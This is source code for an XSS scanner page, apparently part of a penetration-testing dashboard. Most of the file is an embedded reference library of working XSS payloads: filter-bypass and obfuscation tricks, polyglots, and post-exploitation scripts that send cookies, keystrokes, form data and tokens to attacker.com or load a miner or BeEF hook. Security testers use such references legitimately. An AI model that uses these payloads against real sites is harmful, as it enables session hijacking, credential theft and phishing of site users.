'use client';

import { useState, useEffect, useCallback } from 'react';
import { motion } from 'framer-motion';
import {
  Shield,
  Play,
  Square,
  Search,
  Loader2,
  CheckCircle,
  XCircle,
  Clock,
  Eye,
  Plus,
  Link as LinkIcon,
  AlertTriangle,
  Code,
  Copy,
  Check,
  Settings,
  Zap,
  Target,
  BookOpen,
  ChevronDown,
  ChevronRight,
  ExternalLink,
  FileText,
  Bug,
  Lock,
  Globe,
  Terminal,
  Hash,
  Layers,
  Filter,
} from 'lucide-react';
import { cn, formatDateTime } from '@/lib/utils';
import { xssApi } from '@/lib/api';
import Link from 'next/link';

interface XssResult {
  url: string;
  parameter: string;
  payload: string;
  type: 'reflected' | 'stored' | 'dom';
  context: 'html' | 'attribute' | 'script' | 'url' | 'style';
  evidence?: string;
  severity: 'info' | 'low' | 'medium' | 'high' | 'critical';
  wafBypassed?: boolean;
  tool: string;
}

interface ScanLog {
  timestamp: string;
  level: 'info' | 'warn' | 'error' | 'success';
  message: string;
  details?: string;
}

interface XssScan {
  _id: string;
  url: string;
  status: 'pending' | 'running' | 'completed' | 'failed' | 'cancelled';
  config: {
    tools: string[];
    wafBypass?: boolean;
    blindXss?: string;
  };
  results: XssResult[];
  logs: ScanLog[];
  error?: string;
  startedAt?: string;
  completedAt?: string;
  createdAt: string;
  urlsScanned: number;
  totalUrls: number;
  vulnerabilitiesFound: number;
  currentPhase?: string;
}

interface Tool {
  name: string;
  installed: boolean;
  description: string;
}

const statusConfig: Record<string, { icon: any; color: string; bg: string; label: string }> = {
  completed: { icon: CheckCircle, color: 'text-green-400', bg: 'bg-green-500/20', label: 'Completed' },
  running: { icon: Loader2, color: 'text-blue-400', bg: 'bg-blue-500/20', label: 'Running' },
  pending: { icon: Clock, color: 'text-yellow-400', bg: 'bg-yellow-500/20', label: 'Pending' },
  failed: { icon: XCircle, color: 'text-red-400', bg: 'bg-red-500/20', label: 'Failed' },
  cancelled: { icon: Square, color: 'text-orange-400', bg: 'bg-orange-500/20', label: 'Cancelled' },
};

const severityConfig: Record<string, { color: string; bg: string }> = {
  critical: { color: 'text-red-400', bg: 'bg-red-500/20' },
  high: { color: 'text-orange-400', bg: 'bg-orange-500/20' },
  medium: { color: 'text-yellow-400', bg: 'bg-yellow-500/20' },
  low: { color: 'text-blue-400', bg: 'bg-blue-500/20' },
  info: { color: 'text-slate-400', bg: 'bg-slate-500/20' },
};

const contextConfig: Record<string, { label: string; color: string }> = {
  html: { label: 'HTML', color: 'text-orange-400' },
  attribute: { label: 'Attribute', color: 'text-yellow-400' },
  script: { label: 'JavaScript', color: 'text-red-400' },
  url: { label: 'URL', color: 'text-blue-400' },
  style: { label: 'CSS', color: 'text-purple-400' },
};

// Comprehensive XSS Reference Data
const xssTypes = [
  {
    name: 'Reflected XSS',
    description: 'Payload is reflected immediately in the response. Non-persistent.',
    severity: 'high',
    manual: [
      'Inject payload in URL parameters: ?search=<script>alert(1)</script>',
      'Test all input fields that reflect in response',
      'Check error messages that display user input',
      'Test search functionality and filters',
      'Examine URL fragments and query strings',
    ],
    payloads: [
      '<script>alert(document.domain)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
    ],
  },
  {
    name: 'Stored XSS',
    description: 'Payload is stored on server and executed when page is viewed. Persistent.',
    severity: 'critical',
    manual: [
      'Test comment sections and forums',
      'Check user profile fields (name, bio, etc.)',
      'Test file upload names and metadata',
      'Examine message/chat functionality',
      'Test admin panels that display user data',
    ],
    payloads: [
      '<script>fetch("https://attacker.com?c="+document.cookie)</script>',
      '<img src=x onerror="new Image().src=\'https://attacker.com/?\'+document.cookie">',
      '<svg/onload=fetch(`//attacker.com?${document.cookie}`)>',
    ],
  },
  {
    name: 'DOM-based XSS',
    description: 'Payload is executed via client-side JavaScript without server involvement.',
    severity: 'high',
    manual: [
      'Check document.location, document.URL, document.referrer usage',
      'Test window.name and postMessage handlers',
      'Examine innerHTML, outerHTML, document.write usage',
      'Check eval(), setTimeout(), setInterval() with user input',
      'Test jQuery selectors with user-controlled data',
    ],
    payloads: [
      '#<img src=x onerror=alert(1)>',
      'javascript:alert(document.domain)',
      'data:text/html,<script>alert(1)</script>',
      '#"><img src=x onerror=alert(1)>',
    ],
  },
  {
    name: 'Blind XSS',
    description: 'Payload executes in a different context (admin panel, logs, etc.).',
    severity: 'critical',
    manual: [
      'Inject payloads in support tickets',
      'Test contact forms and feedback',
      'Check user-agent and referer headers',
      'Test log injection points',
      'Use XSS Hunter or similar callback services',
    ],
    payloads: [
      '"><script src=https://xss.ht></script>',
      '<img src=x onerror="var s=document.createElement(\'script\');s.src=\'https://xss.ht\';document.body.appendChild(s);">',
      '"><iframe src="javascript:var s=document.createElement(\'script\');s.src=\'https://xss.ht\';document.body.appendChild(s);">',
    ],
  },
  {
    name: 'Self-XSS',
    description: 'Requires victim to paste malicious code themselves (social engineering).',
    severity: 'low',
    manual: [
      'Check browser console for self-XSS warnings',
      'Test paste functionality in input fields',
      'Examine clipboard-based attacks',
    ],
    payloads: [
      'javascript:alert(document.cookie)',
      'data:text/html,<script>alert(1)</script>',
    ],
  },
  {
    name: 'mXSS (Mutation XSS)',
    description: 'Exploits browser HTML parsing mutations to bypass sanitizers.',
    severity: 'high',
    manual: [
      'Test with malformed HTML that browsers auto-correct',
      'Check DOMPurify and similar sanitizer bypasses',
      'Test nested tags and encoding combinations',
    ],
    payloads: [
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
      '<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(1)//">',
    ],
  },
  {
    name: 'Universal XSS (UXSS)',
    description: 'Exploits browser vulnerabilities to bypass Same-Origin Policy.',
    severity: 'critical',
    manual: [
      'Test browser extensions for XSS',
      'Check PDF viewers and embedded content',
      'Examine browser-specific parsing bugs',
    ],
    payloads: [
      'Browser-specific exploits vary by version',
    ],
  },
];

const injectionContexts = [
  {
    name: 'HTML Context',
    description: 'Injection directly into HTML body',
    detection: 'Input appears between HTML tags',
    breakout: 'Use < and > to create new tags',
    payloads: [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<iframe src="javascript:alert(1)">',
      '<object data="javascript:alert(1)">',
      '<embed src="javascript:alert(1)">',
    ],
  },
  {
    name: 'Attribute Context',
    description: 'Injection inside HTML attribute values',
    detection: 'Input appears inside attribute quotes',
    breakout: 'Close attribute with " or \' then add event handler',
    payloads: [
      '" onmouseover="alert(1)',
      "' onmouseover='alert(1)",
      '" onfocus="alert(1)" autofocus="',
      "' onfocus='alert(1)' autofocus='",
      '" onclick="alert(1)',
      '" onload="alert(1)',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '" style="background:url(javascript:alert(1))',
    ],
  },
  {
    name: 'JavaScript Context',
    description: 'Injection inside JavaScript code blocks',
    detection: 'Input appears inside <script> tags or JS event handlers',
    breakout: 'Close string/statement and inject new code',
    payloads: [
      "';alert(1)//",
      '";alert(1)//',
      "'-alert(1)-'",
      '"-alert(1)-"',
      '</script><script>alert(1)</script>',
      '\\";alert(1)//',
      "${alert(1)}",
      "'+alert(1)+'",
      '`${alert(1)}`',
      "javascript:alert(1)",
    ],
  },
  {
    name: 'URL/href Context',
    description: 'Injection inside href, src, or action attributes',
    detection: 'Input appears in URL-related attributes',
    breakout: 'Use javascript: or data: protocols',
    payloads: [
      'javascript:alert(1)',
      'javascript:alert(document.domain)',
      'data:text/html,<script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
      '//attacker.com/xss.js',
    ],
  },
  {
    name: 'CSS/Style Context',
    description: 'Injection inside style attributes or CSS blocks',
    detection: 'Input appears in style attribute or <style> tags',
    breakout: 'Use expression() (IE) or url() with javascript:',
    payloads: [
      'expression(alert(1))',
      'url(javascript:alert(1))',
      '</style><script>alert(1)</script>',
      "background:url('javascript:alert(1)')",
      '-moz-binding:url("http://attacker.com/xss.xml#xss")',
    ],
  },
  {
    name: 'Template Literal Context',
    description: 'Injection inside JavaScript template literals',
    detection: 'Input appears inside backticks (`)',
    breakout: 'Use ${} to execute JavaScript',
    payloads: [
      '${alert(1)}',
      '${constructor.constructor("alert(1)")()}',
      '`-alert(1)-`',
      '${`${alert(1)}`}',
    ],
  },
];

const eventHandlers = [
  { event: 'onload', tags: 'body, img, svg, iframe, input, frame, frameset, object, style, script, link', example: '<body onload=alert(1)>' },
  { event: 'onerror', tags: 'img, input, object, script, style, video, audio, source, link', example: '<img src=x onerror=alert(1)>' },
  { event: 'onclick', tags: 'All visible elements', example: '<div onclick=alert(1)>Click me</div>' },
  { event: 'onmouseover', tags: 'All visible elements', example: '<div onmouseover=alert(1)>Hover me</div>' },
  { event: 'onfocus', tags: 'input, select, textarea, a, button, area', example: '<input onfocus=alert(1) autofocus>' },
  { event: 'onblur', tags: 'input, select, textarea, a, button', example: '<input onblur=alert(1) autofocus><input autofocus>' },
  { event: 'onchange', tags: 'input, select, textarea', example: '<select onchange=alert(1)><option>1</option></select>' },
  { event: 'onsubmit', tags: 'form', example: '<form onsubmit=alert(1)><input type=submit></form>' },
  { event: 'onkeydown', tags: 'All elements', example: '<input onkeydown=alert(1)>' },
  { event: 'onkeyup', tags: 'All elements', example: '<input onkeyup=alert(1)>' },
  { event: 'onkeypress', tags: 'All elements', example: '<input onkeypress=alert(1)>' },
  { event: 'ondblclick', tags: 'All visible elements', example: '<div ondblclick=alert(1)>Double click</div>' },
  { event: 'oncontextmenu', tags: 'All elements', example: '<div oncontextmenu=alert(1)>Right click</div>' },
  { event: 'ondrag', tags: 'All draggable elements', example: '<div draggable=true ondrag=alert(1)>Drag me</div>' },
  { event: 'ondrop', tags: 'All elements', example: '<div ondrop=alert(1)>Drop here</div>' },
  { event: 'onscroll', tags: 'All scrollable elements', example: '<div onscroll=alert(1) style="overflow:scroll;height:50px"><br><br><br></div>' },
  { event: 'onwheel', tags: 'All elements', example: '<div onwheel=alert(1)>Scroll wheel here</div>' },
  { event: 'oncopy', tags: 'All elements', example: '<div oncopy=alert(1)>Copy this text</div>' },
  { event: 'oncut', tags: 'input, textarea', example: '<input oncopy=alert(1) value="cut me">' },
  { event: 'onpaste', tags: 'input, textarea', example: '<input onpaste=alert(1)>' },
  { event: 'onanimationend', tags: 'All elements with CSS animation', example: '<style>@keyframes x{}</style><div style="animation:x" onanimationend=alert(1)>' },
  { event: 'ontransitionend', tags: 'All elements with CSS transition', example: '<div ontransitionend=alert(1) style="transition:1s" onmouseover="this.style.opacity=0">' },
  { event: 'onresize', tags: 'window, body, frameset', example: '<body onresize=alert(1)>' },
  { event: 'onhashchange', tags: 'body', example: '<body onhashchange=alert(1)>' },
  { event: 'onpopstate', tags: 'body', example: '<body onpopstate=alert(1)>' },
  { event: 'onstorage', tags: 'body', example: '<body onstorage=alert(1)>' },
  { event: 'onmessage', tags: 'body', example: '<body onmessage=alert(1)>' },
  { event: 'ontoggle', tags: 'details', example: '<details open ontoggle=alert(1)>' },
  { event: 'onpointerover', tags: 'All elements', example: '<div onpointerover=alert(1)>Hover</div>' },
  { event: 'onpointerenter', tags: 'All elements', example: '<div onpointerenter=alert(1)>Enter</div>' },
  { event: 'onpointerdown', tags: 'All elements', example: '<div onpointerdown=alert(1)>Click</div>' },
  { event: 'onbeforeinput', tags: 'input, textarea', example: '<input onbeforeinput=alert(1)>' },
  { event: 'oninput', tags: 'input, textarea, select', example: '<input oninput=alert(1)>' },
  { event: 'onformdata', tags: 'form', example: '<form onformdata=alert(1)><input type=submit></form>' },
  { event: 'onreset', tags: 'form', example: '<form onreset=alert(1)><input type=reset></form>' },
  { event: 'oninvalid', tags: 'input', example: '<input oninvalid=alert(1) required><input type=submit>' },
  { event: 'onselect', tags: 'input, textarea', example: '<input onselect=alert(1) value="select me">' },
  { event: 'onsearch', tags: 'input[type=search]', example: '<input type=search onsearch=alert(1)>' },
];

const wafBypassTechniques = [
  {
    name: 'Case Variation',
    description: 'Mix uppercase and lowercase letters',
    payloads: [
      '<ScRiPt>alert(1)</ScRiPt>',
      '<IMG SRC=x OnErRoR=alert(1)>',
      '<sVg OnLoAd=alert(1)>',
    ],
  },
  {
    name: 'Encoding Bypass',
    description: 'Use various encoding methods',
    payloads: [
      '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
      '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
      '<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74(1)>',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
    ],
  },
  {
    name: 'Tag Manipulation',
    description: 'Use alternative or malformed tags',
    payloads: [
      '<svg/onload=alert(1)>',
      '<svg\\x0aonload=alert(1)>',
      '<svg\\x0donload=alert(1)>',
      '<svg\\x09onload=alert(1)>',
      '<svg\\x0conload=alert(1)>',
      '<<script>alert(1)//<</script>',
      '<script\\x20type="text/javascript">alert(1)</script>',
    ],
  },
  {
    name: 'Null Bytes & Comments',
    description: 'Insert null bytes or HTML comments',
    payloads: [
      '<scr\\x00ipt>alert(1)</script>',
      '<img src=x onerror="al"+"ert(1)">',
      '<img src=x onerror=alert(1)//comment>',
      '<!--><script>alert(1)</script>-->',
      '<script>/**/alert(1)/**/</script>',
    ],
  },
  {
    name: 'Double Encoding',
    description: 'Encode payloads multiple times',
    payloads: [
      '%253Cscript%253Ealert(1)%253C/script%253E',
      '%26lt;script%26gt;alert(1)%26lt;/script%26gt;',
    ],
  },
  {
    name: 'Alternative Functions',
    description: 'Use alternative JavaScript functions',
    payloads: [
      '<img src=x onerror=confirm(1)>',
      '<img src=x onerror=prompt(1)>',
      '<img src=x onerror=console.log(1)>',
      '<img src=x onerror=eval("ale"+"rt(1)")>',
      '<img src=x onerror=Function("alert(1)")()>',
      '<img src=x onerror=setTimeout("alert(1)")>',
      '<img src=x onerror=setInterval("alert(1)")>',
      '<img src=x onerror=[].constructor.constructor("alert(1)")()>',
    ],
  },
  {
    name: 'Protocol Handlers',
    description: 'Use different protocol handlers',
    payloads: [
      '<a href="javascript:alert(1)">click</a>',
      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
      '<a href="vbscript:alert(1)">click</a>',
      '<iframe src="javascript:alert(1)">',
    ],
  },
  {
    name: 'Obfuscation',
    description: 'Obfuscate JavaScript code',
    payloads: [
      '<img src=x onerror=window["alert"](1)>',
      '<img src=x onerror=this["alert"](1)>',
      '<img src=x onerror=top["al"+"ert"](1)>',
      '<img src=x onerror=self[`alert`](1)>',
      '<img src=x onerror=(alert)(1)>',
      '<img src=x onerror=alert?.()>',
      '<img src=x onerror=Reflect.apply(alert,null,[1])>',
    ],
  },
  {
    name: 'Whitespace Bypass',
    description: 'Use alternative whitespace characters',
    payloads: [
      '<svg\\tonload=alert(1)>',
      '<svg\\nonload=alert(1)>',
      '<svg\\ronload=alert(1)>',
      '<svg/onload=alert(1)>',
      '<svg\\x0bonload=alert(1)>',
    ],
  },
  {
    name: 'Filter Evasion',
    description: 'Bypass specific keyword filters',
    payloads: [
      '<img src=x onerror=ale\\u0072t(1)>',
      '<img src=x onerror=\\u0061lert(1)>',
      '<img src=x onerror=al\\x65rt(1)>',
      '<img src=x onerror=top[/al/.source+/ert/.source](1)>',
      '<img src=x onerror=top[8680439..toString(30)](1)>',
    ],
  },
];

const encodingMethods = [
  {
    name: 'HTML Entity Encoding',
    description: 'Convert characters to HTML entities',
    examples: [
      { original: '<', encoded: '&lt; or &#60; or &#x3c;' },
      { original: '>', encoded: '&gt; or &#62; or &#x3e;' },
      { original: '"', encoded: '&quot; or &#34; or &#x22;' },
      { original: "'", encoded: '&#39; or &#x27;' },
      { original: 'alert', encoded: '&#97;&#108;&#101;&#114;&#116;' },
    ],
  },
  {
    name: 'URL Encoding',
    description: 'Percent-encode characters',
    examples: [
      { original: '<', encoded: '%3C' },
      { original: '>', encoded: '%3E' },
      { original: '"', encoded: '%22' },
      { original: "'", encoded: '%27' },
      { original: '<script>', encoded: '%3Cscript%3E' },
    ],
  },
  {
    name: 'Double URL Encoding',
    description: 'Encode the percent sign itself',
    examples: [
      { original: '<', encoded: '%253C' },
      { original: '>', encoded: '%253E' },
      { original: '<script>', encoded: '%253Cscript%253E' },
    ],
  },
  {
    name: 'Unicode Encoding',
    description: 'Use Unicode escape sequences',
    examples: [
      { original: 'alert', encoded: '\\u0061\\u006c\\u0065\\u0072\\u0074' },
      { original: '<', encoded: '\\u003c' },
      { original: '>', encoded: '\\u003e' },
    ],
  },
  {
    name: 'Hex Encoding',
    description: 'Use hexadecimal escape sequences',
    examples: [
      { original: 'alert', encoded: '\\x61\\x6c\\x65\\x72\\x74' },
      { original: '<', encoded: '\\x3c' },
      { original: '>', encoded: '\\x3e' },
    ],
  },
  {
    name: 'Octal Encoding',
    description: 'Use octal escape sequences',
    examples: [
      { original: 'alert', encoded: '\\141\\154\\145\\162\\164' },
    ],
  },
  {
    name: 'Base64 Encoding',
    description: 'Encode payload in Base64',
    examples: [
      { original: 'alert(1)', encoded: 'YWxlcnQoMSk=' },
      { original: '<script>alert(1)</script>', encoded: 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
    ],
  },
  {
    name: 'JSFuck',
    description: 'Encode JavaScript using only []()!+',
    examples: [
      { original: 'alert(1)', encoded: '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+...' },
    ],
  },
];

const domSinks = [
  { sink: 'document.write()', risk: 'Critical', description: 'Writes HTML directly to document' },
  { sink: 'document.writeln()', risk: 'Critical', description: 'Writes HTML with newline' },
  { sink: 'element.innerHTML', risk: 'Critical', description: 'Sets HTML content of element' },
  { sink: 'element.outerHTML', risk: 'Critical', description: 'Replaces element with HTML' },
  { sink: 'element.insertAdjacentHTML()', risk: 'Critical', description: 'Inserts HTML at position' },
  { sink: 'eval()', risk: 'Critical', description: 'Executes string as JavaScript' },
  { sink: 'setTimeout()', risk: 'High', description: 'Executes code after delay' },
  { sink: 'setInterval()', risk: 'High', description: 'Executes code repeatedly' },
  { sink: 'Function()', risk: 'Critical', description: 'Creates function from string' },
  { sink: 'element.src', risk: 'High', description: 'Sets source URL (script, img, iframe)' },
  { sink: 'element.href', risk: 'High', description: 'Sets hyperlink URL' },
  { sink: 'location.href', risk: 'High', description: 'Navigates to URL' },
  { sink: 'location.assign()', risk: 'High', description: 'Navigates to URL' },
  { sink: 'location.replace()', risk: 'High', description: 'Replaces current URL' },
  { sink: 'window.open()', risk: 'Medium', description: 'Opens new window/tab' },
  { sink: 'jQuery.html()', risk: 'Critical', description: 'Sets HTML content (jQuery)' },
  { sink: 'jQuery.append()', risk: 'High', description: 'Appends HTML content (jQuery)' },
  { sink: 'jQuery.prepend()', risk: 'High', description: 'Prepends HTML content (jQuery)' },
  { sink: 'jQuery.after()', risk: 'High', description: 'Inserts HTML after element (jQuery)' },
  { sink: 'jQuery.before()', risk: 'High', description: 'Inserts HTML before element (jQuery)' },
  { sink: 'element.setAttribute()', risk: 'Medium', description: 'Sets attribute value' },
  { sink: 'document.cookie', risk: 'Medium', description: 'Sets cookie value' },
  { sink: 'postMessage()', risk: 'Medium', description: 'Sends message to window' },
];

const domSources = [
  { source: 'document.URL', description: 'Full URL of document' },
  { source: 'document.documentURI', description: 'URI of document' },
  { source: 'document.baseURI', description: 'Base URI of document' },
  { source: 'document.referrer', description: 'Referring URL' },
  { source: 'document.cookie', description: 'Document cookies' },
  { source: 'location.href', description: 'Full URL' },
  { source: 'location.search', description: 'Query string' },
  { source: 'location.hash', description: 'URL fragment' },
  { source: 'location.pathname', description: 'URL path' },
  { source: 'window.name', description: 'Window name' },
  { source: 'history.pushState()', description: 'History state' },
  { source: 'history.replaceState()', description: 'History state' },
  { source: 'localStorage', description: 'Local storage data' },
  { source: 'sessionStorage', description: 'Session storage data' },
  { source: 'IndexedDB', description: 'IndexedDB data' },
  { source: 'postMessage data', description: 'Message event data' },
  { source: 'WebSocket data', description: 'WebSocket message data' },
  { source: 'XMLHttpRequest response', description: 'AJAX response data' },
  { source: 'fetch() response', description: 'Fetch API response' },
];

const polyglotPayloads = [
  {
    name: 'Universal Polyglot',
    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    description: 'Works in multiple contexts: HTML, JS, URL',
  },
  {
    name: 'Portswigger Polyglot',
    payload: "'\">--></style></script><script>alert(String.fromCharCode(88,83,83))</script>",
    description: 'Breaks out of strings, comments, and tags',
  },
  {
    name: 'Rsnake Polyglot',
    payload: "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    description: 'Multiple context breakouts',
  },
  {
    name: 'Compact Polyglot',
    payload: "\"'--></style></script><svg onload=alert(1)>",
    description: 'Short polyglot for multiple contexts',
  },
  {
    name: 'Attribute Polyglot',
    payload: "\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
    description: 'Works in various attribute contexts',
  },
  {
    name: 'JavaScript Polyglot',
    payload: "'-alert(1)-'",
    description: 'Works in JS string contexts',
  },
  {
    name: 'Template Literal Polyglot',
    payload: "${alert(1)}'-alert(1)-'\"onmouseover=alert(1)//",
    description: 'Works in template literals and strings',
  },
];

const browserSpecificPayloads = [
  {
    browser: 'Chrome/Edge',
    payloads: [
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      '<svg><set onbegin=alert(1) attributeName=x to=1>',
      '<svg><discard onbegin=alert(1)>',
    ],
  },
  {
    browser: 'Firefox',
    payloads: [
      '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>',
      '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click</maction></math>',
    ],
  },
  {
    browser: 'Safari',
    payloads: [
      '<svg><animate onend=alert(1) dur=1ms attributeName=x>',
      '<marquee onfinish=alert(1)>',
    ],
  },
  {
    browser: 'Internet Explorer',
    payloads: [
      '<div style="background:url(javascript:alert(1))">',
      '<div style="width:expression(alert(1))">',
      '<vmlframe src="javascript:alert(1)">',
      '<x style="behavior:url(#default#time2)" onbegin="alert(1)">',
    ],
  },
];

const postExploitation = [
  {
    name: 'Cookie Stealing',
    description: 'Exfiltrate session cookies',
    payload: '<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>',
  },
  {
    name: 'Keylogging',
    description: 'Capture keystrokes',
    payload: '<script>document.onkeypress=function(e){new Image().src="https://attacker.com/log?k="+e.key}</script>',
  },
  {
    name: 'Form Hijacking',
    description: 'Capture form submissions',
    payload: '<script>document.forms[0].action="https://attacker.com/capture"</script>',
  },
  {
    name: 'Phishing',
    description: 'Inject fake login form',
    payload: '<script>document.body.innerHTML=\'<form action="https://attacker.com/phish"><input name="user"><input name="pass" type="password"><button>Login</button></form>\'</script>',
  },
  {
    name: 'Defacement',
    description: 'Modify page content',
    payload: '<script>document.body.innerHTML="<h1>Hacked!</h1>"</script>',
  },
  {
    name: 'Crypto Mining',
    description: 'Inject cryptocurrency miner',
    payload: '<script src="https://attacker.com/miner.js"></script>',
  },
  {
    name: 'Port Scanning',
    description: 'Scan internal network',
    payload: '<script>for(var i=1;i<255;i++){new Image().src="http://192.168.1."+i+":80"}</script>',
  },
  {
    name: 'CSRF via XSS',
    description: 'Perform actions as victim',
    payload: '<script>fetch("/api/admin/delete",{method:"POST",credentials:"include"})</script>',
  },
  {
    name: 'Session Hijacking',
    description: 'Steal and use session',
    payload: '<script>fetch("https://attacker.com/session?token="+localStorage.getItem("token"))</script>',
  },
  {
    name: 'BeEF Hook',
    description: 'Hook browser to BeEF framework',
    payload: '<script src="http://attacker.com:3000/hook.js"></script>',
  },
];

const manualTestingSteps = [
  {
    step: 1,
    title: 'Identify Input Points',
    description: 'Find all places where user input is reflected',
    actions: [
      'URL parameters (?param=value)',
      'Form fields (text, hidden, textarea)',
      'HTTP headers (User-Agent, Referer, Cookie)',
      'File upload names and content',
      'JSON/XML data in API requests',
      'WebSocket messages',
    ],
  },
  {
    step: 2,
    title: 'Test for Reflection',
    description: 'Inject unique strings and check where they appear',
    actions: [
      'Inject unique string like "xss123test"',
      'Search response for the string',
      'Note the context (HTML, attribute, JS, etc.)',
      'Check if encoding is applied',
    ],
  },
  {
    step: 3,
    title: 'Determine Context',
    description: 'Identify the exact context of reflection',
    actions: [
      'HTML body: between tags',
      'HTML attribute: inside quotes',
      'JavaScript: inside script block',
      'URL: in href/src attributes',
      'CSS: in style attribute/block',
    ],
  },
  {
    step: 4,
    title: 'Craft Context-Specific Payload',
    description: 'Create payload that breaks out of context',
    actions: [
      'HTML: <script>alert(1)</script>',
      'Attribute: " onmouseover="alert(1)',
      'JavaScript: ";alert(1);//',
      'URL: javascript:alert(1)',
    ],
  },
  {
    step: 5,
    title: 'Test Filter Bypasses',
    description: 'If blocked, try bypass techniques',
    actions: [
      'Case variation: <ScRiPt>',
      'Encoding: &#x3c;script&#x3e;',
      'Alternative tags: <svg>, <img>',
      'Event handlers: onerror, onload',
      'Null bytes and comments',
    ],
  },
  {
    step: 6,
    title: 'Verify Execution',
    description: 'Confirm the XSS payload executes',
    actions: [
      'Check browser console for errors',
      'Use alert/confirm/prompt for PoC',
      'Test in multiple browsers',
      'Document the vulnerability',
    ],
  },
];

export default function XssPage() {
  // Form state
  const [url, setUrl] = useState('');
  const [selectedTools, setSelectedTools] = useState<string[]>(['builtin']);
  const [wafBypass, setWafBypass] = useState(false);
  const [blindXss, setBlindXss] = useState('');
  const [threads, setThreads] = useState('10');
  const [timeout, setTimeout] = useState('30');
  const [cookies, setCookies] = useState('');
  const [customPayloads, setCustomPayloads] = useState('');
  const [showAdvanced, setShowAdvanced] = useState(false);

  // UI state
  const [tools, setTools] = useState<Tool[]>([]);
  const [scans, setScans] = useState<XssScan[]>([]);
  const [selectedScan, setSelectedScan] = useState<XssScan | null>(null);
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [mounted, setMounted] = useState(false);
  const [showForm, setShowForm] = useState(true);
  const [resultFilter, setResultFilter] = useState('');
  const [copiedPayload, setCopiedPayload] = useState<string | null>(null);
  const [payloads, setPayloads] = useState<string[]>([]);
  const [showPayloads, setShowPayloads] = useState(false);

  // Reference section state
  const [showReference, setShowReference] = useState(false);
  const [activeRefTab, setActiveRefTab] = useState('types');
  const [expandedType, setExpandedType] = useState<string | null>(null);
  const [expandedContext, setExpandedContext] = useState<string | null>(null);
  const [expandedBypass, setExpandedBypass] = useState<string | null>(null);

  // Fetch tools and scans on mount
  useEffect(() => {
    setMounted(true);
    const fetchData = async () => {
      try {
        const [toolsRes, scansRes, payloadsRes] = await Promise.all([
          xssApi.getTools(),
          xssApi.getScans(),
          xssApi.getPayloads('all'),
        ]);
        setTools(toolsRes.data || []);
        setScans(scansRes.data || []);
        setPayloads(payloadsRes.data.payloads || []);
      } catch (err) {
        console.error('Failed to fetch data:', err);
      } finally {
        setLoading(false);
      }
    };
    fetchData();
  }, []);

  // Poll for scan updates
  useEffect(() => {
    const hasRunningScans = scans.some(s => s.status === 'running' || s.status === 'pending');
    if (!hasRunningScans) return;

    const interval = setInterval(async () => {
      try {
        const scansRes = await xssApi.getScans();
        setScans(scansRes.data || []);

        if (selectedScan && (selectedScan.status === 'running' || selectedScan.status === 'pending')) {
          const updatedScan = await xssApi.getScan(selectedScan._id);
          setSelectedScan(updatedScan.data);
        }
      } catch (err) {
        console.error('Failed to poll scans:', err);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [scans, selectedScan]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!url) return;

    setSubmitting(true);
    try {
      const config: any = {
        url,
        tools: selectedTools,
        wafBypass,
        threads: parseInt(threads) || 10,
        timeout: parseInt(timeout) || 30,
      };

      if (blindXss.trim()) config.blindXss = blindXss;
      if (cookies.trim()) config.cookies = cookies;
      if (customPayloads.trim()) {
        config.customPayloads = customPayloads.split('\n').filter(Boolean);
      }

      const response = await xssApi.start(config);
      setScans(prev => [response.data, ...prev]);
      setSelectedScan(response.data);
      setShowForm(false);

      // Reset form
      setUrl('');
      setBlindXss('');
      setCookies('');
      setCustomPayloads('');
    } catch (err) {
      console.error('Failed to start XSS scan:', err);
    } finally {
      setSubmitting(false);
    }
  };

  const handleCancel = async (scanId: string) => {
    try {
      await xssApi.cancel(scanId);
      const scansRes = await xssApi.getScans();
      setScans(scansRes.data || []);
      if (selectedScan?._id === scanId) {
        const updatedScan = await xssApi.getScan(scanId);
        setSelectedScan(updatedScan.data);
      }
    } catch (err) {
      console.error('Failed to cancel scan:', err);
    }
  };

  const handleViewScan = async (scan: XssScan) => {
    try {
      const response = await xssApi.getScan(scan._id);
      setSelectedScan(response.data);
      setShowForm(false);
    } catch (err) {
      console.error('Failed to fetch scan:', err);
    }
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopiedPayload(payload);
